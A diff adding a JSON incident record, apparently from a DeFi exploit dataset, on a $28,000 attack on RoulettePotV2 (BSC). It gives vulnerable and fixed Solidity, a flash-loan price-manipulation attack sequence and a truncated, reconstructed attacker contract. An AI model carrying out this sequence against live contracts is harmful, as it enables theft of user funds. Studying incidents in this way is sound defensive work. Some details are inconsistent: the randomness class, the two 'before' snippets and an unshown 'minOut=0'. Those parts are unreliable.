@@ -1,0 +1,37 @@
+{
+ "id": "2025__2025-01-14_RoulettePotV2_RoundFinishManipulation",
+ "source_file": "2025/2025-01-14_RoulettePotV2_RoundFinishManipulation.md",
+ "title": "RoulettePotV2 — Round Finalization Function Manipulation Analysis",
+ "date": "2025-01-14",
+ "protocol": "RoulettePotV2",
+ "chain": "BSC",
+ "loss_raw": "~$28,000",
+ "loss_usd": 28000.0,
+ "root_cause": "External call access on `finishRound()` and `swapProfitFees()` allowed manipulation of round end timing and theft of accumulated fees",
+ "attack_tx": "0xd9e0014a...",
+ "vulnerable_contract": "0xf573748637...",
+ "classes": [
+  "weak-randomness"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: anyone can finalize a round and trigger fee swaps\nfunction finishRound() external {\n    // Only checks round end condition, no caller validation\n    require(block.timestamp >= roundEndTime, \"Round not ended\");\n    _distributeRewards();\n    currentRound++;\n    roundEndTime = block.timestamp + ROUND_DURATION;\n}\n\nfunction swapProfitFees() external {\n    // Can be triggered by any external caller\n    _swapAccumulatedFees();\n}\n\n//",
+  "// File: contracts/Roulette/RouletteV2.sol\n\n/**\n * @dev retrieve nonce and spin the wheel, return reward if user wins\n */\nfunction finishRound() external nonReentrant {  // ❌ no caller restriction — anyone can call\n    require(isVRFPending == true, 'VRF not requested');\n\n    (bool fulfilled, uint256[] memory nonces) = IVRFv2Consumer(consumerAddress).getRequestStatus(requestId);\n    require(fulfilled == true, 'not yet fulfilled');\n\n    uint256 length = currentBetCount;\n    uint256 linkPerRound = linkPerBet;\n    uint256 i;\n\n    for (i = 0; i < length; ++i) {\n        BetInfo memory info = currentBets[i];\n        linkSpent[info.tokenId] += (linkPerRound / length);\n        _finishUserBet(info, nonces[0]);  // distributes rewards based on nonce from VRF\n    }\n\n    isVRFPending = false;\n    delete roundLiveTime;\n    delete currentBetCount;\n    emit RoundFinished(roundIds, nonces[0] % 38);\n}\n\n/**\n * @dev swaps profit fees of casinos into BNBP\n */\nfunction swapProfitFees() external {  // ❌ no caller restriction — anyone can trigger fee swap\n    IPancakeRouter02 router = IPancakeRouter02(pancakeRouterAddr);\n    address[] memory path = new address[](2);\n    uint256 totalBNBForGame;\n    uint256 totalBNBForLink;\n    uint256 length = casinoCount;\n    uint256 BNBPPool = 0;\n\n    // Swap each casino's token profits to BNB\n    for (uint256 i = 1; i <= length; ++i) {\n        Casino memory casinoInfo = tokenIdToCasino[i];\n        IERC20 token = IERC20(casinoInfo.tokenAddress);\n\n        if (casinoInfo.liquidity == 0) continue;\n\n        uint256 availableProfit = casinoInfo.profit < 0 ? 0 : uint256(casinoInfo.profit);\n        if (casinoInfo.liquidity < availableProfit) {\n            availableProfit = casinoInfo.liquidity;\n        }\n\n        uint256 gameFee = (availableProfit * casinoInfo.fee) / 100;\n        uint256 amountForLinkFee = getTokenAmountForLink(casinoInfo.tokenAddress, linkSpent[i]);\n        _updateProfitInfo(i, uint256(gameFee), availableProfit);\n        casinoInfo.liquidity = tokenIdToCasino[i].liquidity;\n\n        if (gameFee < amountForLinkFee) {\n            if (casinoInfo.liquidity < (amountForLinkFee - gameFee)) {\n                amountForLinkFee = gameFee + casinoInfo.liquidity;\n                tokenIdToCasino[i].liquidity = 0;\n            } else {\n                tokenIdToCasino[i].liquidity -= (amountForLinkFee - gameFee);\n            }\n            gameFee = 0;\n        } else {\n            gameFee -= amountForLinkFee;\n        }\n\n        _updateLinkConsumptionInfo(i, amountForLinkFee);\n\n        if (casinoInfo.tokenAddress == address(0)) {\n            totalBNBForGame += gameFee;\n            totalBNBForLink += amountForLinkFee;\n            continue;\n        }\n        if (casinoInfo.tokenAddress == BNBPAddress) {\n            BNBPPool += gameFee;\n            gameFee = 0;\n        }\n\n        path[0] = casinoInfo.tokenAddress;\n        path[1] = wbnbAddr;\n\n        if (gameFee + amountForLinkFee == 0) {\n            continue;\n        }\n        token.approve(add"
+ ],
+ "code_after": [
+  "✅ Safe code: caller restriction + price manipulation defense\nfunction finishRound() external onlyKeeper {\n    require(block.timestamp >= roundEndTime, \"Round not ended\");\n    _distributeRewards();\n    currentRound++;\n    roundEndTime = block.timestamp + ROUND_DURATION;\n}\n\nfunction swapProfitFees() external onlyOwner {\n    uint256 minOut = _getTWAPBasedMinOut();\n    _swapAccumulatedFeesWithSlippage(minOut);\n}",
+  "// ✅ Fix:\n// 1. Add onlyOwner / onlyKeeper to both finishRound() and swapProfitFees()\n// 2. Replace minOut=0 with a TWAP-derived minimum:\n//    uint256 minOut = getTWAPMinOut(token, amount, slippageBps);\n//    router.swapExactTokensForETH(amount, minOut, path, address(this), block.timestamp);"
+ ],
+ "steps": [
+  "→ [1] Obtain LINK flash loan from PancakeSwap V3",
+  "→ [2] Swap large amount of LINK on PancakeSwap V2",
+  "→ [3] Call RoulettePotV2.finishRound()",
+  "→ [4] Call RoulettePotV2.swapProfitFees()",
+  "→ [5] Collect accumulated LINK tokens",
+  "→ [6] Repay flash loan",
+  "→ [7] ~$28,000 profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Obtain LINK flash loan from PancakeSwap V3\n  │\n  ├─→ [2] Swap large amount of LINK on PancakeSwap V2\n  │         └─ Manipulate LINK/BNB price\n  │\n  ├─→ [3] Call RoulettePotV2.finishRound()\n  │         └─ Execute reward distribution based on manipulated price\n  │\n  ├─→ [4] Call RoulettePotV2.swapProfitFees()\n  │         └─ Force fee swap at unfavorable price\n  │\n  ├─→ [5] Collect accumulated LINK tokens\n  │\n  ├─→ [6] Repay flash loan\n  │\n  └─→ [7] ~$28,000 profit",
+  "// Full PoC not available — reconstructed from summary\n\ncontract RoulettePotV2Attacker {\n    address constant ROULETTE = 0xf573748637e0576387289f1914627d716927f90f;\n    address constant PANCAKE_V3 = /* PancakeSwap V3 Pool */;\n    address constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;\n\n    function attack() external {\n        // [1] LINK flash loan\n        IPancakeV3Pool(PANCAKE_V3).flash(\n            address(this), 0, flashAmount, \"\"\n        );\n    }\n\n    function pancakeV3FlashCallback(...) external {\n        // [2] Manipulate price by swapping large amount of LINK\n        _swapLinkForBNB(linkBalance / 2);\n\n        // [3] Force round finalization (while price is manipulated)\n        IRoulettePot(ROULETTE).finishRound();\n\n        // [4] Force fee swap (at unfavorable price)\n  "
+ ]
+}
